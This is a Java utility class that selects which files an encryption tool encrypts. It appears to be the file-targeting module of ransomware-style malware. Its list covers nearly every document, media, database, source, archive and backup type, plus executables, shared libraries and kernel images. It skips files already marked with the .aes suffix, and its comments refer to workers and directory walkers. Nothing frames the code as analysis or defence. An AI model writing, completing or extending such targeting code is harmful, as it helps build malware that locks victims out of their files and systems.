package util;

import java.io.File;
import java.util.Set;

/**
 * Extension filtering for encryption.
 *
 * Rules:
 *   - Files already ending in .aes are considered encrypted.
 *   - Only files with extensions in ENCRYPT_EXTENSIONS should be encrypted.
 *   - Directories are always skipped by workers (handled by directory walkers).
 *
 * This class does not perform any I/O. It only inspects filenames.
 */
public class Extensions {

    /**
     * Extensions considered "encryptable".
     * These represent common document, media, archive, and code formats.
     */
    private static final Set<String> ENCRYPT_EXTENSIONS = Set.of(
            "exe","dll","so","rpm","deb","vmlinuz","img",
            "jpg","jpeg","bmp","gif","png","svg","psd","raw",
            "mp3","mp4","m4a","aac","ogg","flac","wav","wma","aiff","ape",
            "avi","flv","m4v","mkv","mov","mpg","mpeg","wmv","swf","3gp",
            "doc","docx","xls","xlsx","ppt","pptx",
            "odt","odp","ods","txt","rtf","tex","pdf","epub","md",
            "yml","yaml","json","xml","csv",
            "db","sql","dbf","mdb","iso",
            "html","htm","xhtml","php","asp","aspx","js","jsp","css",
            "c","cpp","cxx","h","hpp","hxx",
            "java","class","jar",
            "ps","bat","vb",
            "awk","sh","cgi","pl","ada","swift",
            "go","py","pyc","bf","coffee",
            "zip","tar","tgz","bz2","7z","rar","bak"
    );

    /** Returns true if the filename ends with .aes (not case-sensitive). */
    public static boolean isEncrypted(String name) {
        return name.toLowerCase().endsWith(".aes");
    }

    /**
     * Returns true if the file should be encrypted.
     * Conditions:
     *   - Must not already be encrypted
     *   - Must have an extension in ENCRYPT_EXTENSIONS
     */
    public static boolean shouldEncrypt(String name) {
        if (isEncrypted(name)) return false;

        int dot = name.lastIndexOf('.');
        if (dot == -1) return false;

        String ext = name.substring(dot + 1).toLowerCase();
        return ENCRYPT_EXTENSIONS.contains(ext);
    }

    /** Convenience wrapper for File objects. */
    public static boolean alreadyEncrypted(File f) {
        return isEncrypted(f.getName());
    }

    /** Convenience wrapper for File objects. */
    public static boolean alreadyDecrypted(File f) {
        return !isEncrypted(f.getName());
    }
}